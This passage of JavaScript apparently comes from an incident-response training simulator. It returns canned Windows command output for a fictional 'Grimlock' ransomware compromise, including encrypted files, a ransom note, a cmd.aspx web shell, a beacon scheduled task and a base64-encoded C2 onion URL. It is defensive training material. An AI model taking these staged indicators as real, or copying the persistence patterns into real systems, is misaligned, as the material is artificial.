            const hasRecurse = args.includes('/s') || args.includes('/S');

            if (path.toLowerCase().includes('sensitivedata')) {
                return ` Volume in drive C is OS
 Directory of C:\\SensitiveData

01/10/2026  09:30 AM    <DIR>          .
01/10/2026  09:30 AM    <DIR>          ..
01/10/2026  09:28 AM         2,048,576 financial_records.xlsx.grimlock
01/10/2026  09:28 AM         4,194,304 personnel_database.accdb.grimlock
01/10/2026  09:29 AM         1,048,576 strategic_plans.docx.grimlock
01/10/2026  09:30 AM               847 RANSOM_NOTE.txt
               4 File(s)      7,292,303 bytes`;
            }

            if (path.toLowerCase().includes('programdata')) {
                return ` Volume in drive C is OS
 Directory of C:\\ProgramData

01/10/2026  09:23 AM    <DIR>          .
01/10/2026  09:23 AM    <DIR>          ..
01/10/2026  09:23 AM             1,847 beacon.ps1
01/10/2026  09:24 AM           286,720 grimlock_encrypt.exe
01/10/2026  09:23 AM            12,288 beacon_svc.exe
               3 File(s)        300,855 bytes`;
            }

            if (path.toLowerCase().includes('wwwroot')) {
                return ` Volume in drive C is OS
 Directory of C:\\inetpub\\wwwroot

01/10/2026  09:22 AM    <DIR>          .
01/10/2026  09:22 AM    <DIR>          ..
01/05/2026  14:00 PM             2,048 index.html
01/10/2026  09:22 AM               512 cmd.aspx
01/05/2026  14:00 PM               384 web.config
               3 File(s)          2,944 bytes`;
            }

            return ` Volume in drive C is OS
 Directory of ${path}

01/10/2026  10:00 AM    <DIR>          .
01/10/2026  10:00 AM    <DIR>          ..
01/10/2026  10:00 AM    <DIR>          Desktop
01/10/2026  10:00 AM    <DIR>          Documents
               0 File(s)              0 bytes`;
        },

        'ipconfig': function() {
            return `
Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : citadel.local
   IPv4 Address. . . . . . . . . . . : 10.10.50.100
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.50.1`;
        },

        'systeminfo': function() {
            return `
Host Name:                 ADMIN-NEXUS-01
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
System Type:               x64-based PC
Domain:                    citadel.local
Hotfix(s):                 4 Hotfix(s) Installed.
                           [01]: KB5034127
                           [02]: KB5034439
                           [03]: KB5035849
                           [04]: KB5036896
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L
                                 IPv4 Address: 10.10.50.100`;
        },

        'whoami': function(args) {
            if (args.includes('/priv') || args.includes('/all')) {
                return `USER INFORMATION
----------------
User Name                SID
======================== ============================================
admin-nexus-01\\emergency_admin S-1-5-21-3842939050-3880317879-2865463114-1002

PRIVILEGES INFORMATION
----------------------
Privilege Name                  Description                               State
=============================== ========================================= ========
SeBackupPrivilege               Back up files and directories              Enabled
SeRestorePrivilege              Restore files and directories              Enabled
SeShutdownPrivilege             Shut down the system                       Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                   Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set             Enabled`;
            }
            return 'admin-nexus-01\\emergency_admin';
        },

        'powershell': function(args) {
            const code = args.join(' ');
            if (code.includes('FromBase64String') && code.includes('R3JpbWxvY2tEZWNyeXB0S2V5RnJhZ21lbnQ')) {
                return 'GrimlockDecryptKeyFragment';
            }
            if (code.includes('base64') || code.includes('Base64')) {
                if (code.includes('R3JpbWxvY2tEZWNyeXB0S2V5RnJhZ21lbnQ')) {
                    return 'GrimlockDecryptKeyFragment';
                }
                if (code.includes('aHR0cHM6Ly9ncmltbG9jay1jMi5kYXJrbmV0Lm9uaW9uL2JlYWNvbg')) {
                    return 'https://grimlock-c2.darknet.onion/beacon';
                }
            }
            if (code.includes('Get-WinEvent') || code.includes('get-winevent')) {
                return 'TimeCreated          Id LevelDisplayName Message\n-----------          -- ---------------- -------\n1/10/2026 9:22:10 AM 4624 Information    An account was successfully logged on. (Network, SYSTEM, 203.0.113.42)\n1/10/2026 9:22:22 AM 4688 Information    A new process has been created. (cmd.exe via w3wp.exe)\n1/10/2026 9:23:00 AM 4698 Information    A scheduled task was created. (grimlock_beacon)';
            }
            if (code.includes('Get-ScheduledTask') || code.includes('get-scheduledtask')) {
                return 'TaskPath  TaskName          State\n--------  --------          -----\n\\         grimlock_beacon   Running';
            }
            return 'Windows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\Users\\emergency_admin>';
        },

        'certutil': function(args) {
            if (args.includes('-hashfile')) {
                const file = args.find(a => !a.startsWith('-') && a !== 'MD5' && a !== 'SHA256') || '';
                if (file.includes('beacon') || file.includes('grimlock')) {
                    return `MD5 hash of ${file}:\na1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6\nCertUtil: -hashfile command completed successfully.`;
                }
            }
            return 'Usage: certutil -hashfile <file> [MD5|SHA256]';
        },

        'ping': function(args) {
            const target = args[0] || '';
            if (!target) return 'Usage: ping <target>';
            if (target === '203.0.113.42') {
                return `Pinging 203.0.113.42 with 32 bytes of data:\nRequest timed out.\nRequest timed out.\n\nPing statistics for 203.0.113.42:\n    Packets: Sent = 2, Received = 0, Lost = 2 (100% loss)`;
            }
            if (target === '10.10.50.1' || target === '10.10.50.77') {
                return `Pinging ${target} with 32 bytes of data:\nReply from ${target}: bytes=32 time<1ms TTL=128\nReply from ${target}: bytes=32 time<1ms TTL=128\n\nPing statistics for ${target}:\n    Packets: Sent = 2, Received = 2, Lost = 0 (0% loss)`;
            }
            return `Ping request could not find host ${target}. Please check the name and try again.`;
        },

        'taskkill': function(args) {
            const pidIdx = args.indexOf('/PID') !== -1 ? args.indexOf('/PID') : args.indexOf('/pid');
            const pid = pidIdx !== -1 ? args[pidIdx + 1] : '';
            if (pid === '3192' || pid === '2748' || pid === '3456') {
                return `SUCCESS: The process with PID ${pid} has been terminated.`;
            }
            return 'Usage: taskkill /PID <pid> /F';
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.8rem;"><thead><tr>';
        headers.forEach(h => {
            html += `<th style="padding:6px 10px; text-align:left; color:#dc2626; border-bottom:2px solid #333; background:rgba(220,38,38,0.1);">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(row => {
            html += '<tr>';
            row.forEach(cell => {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #222;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }
};
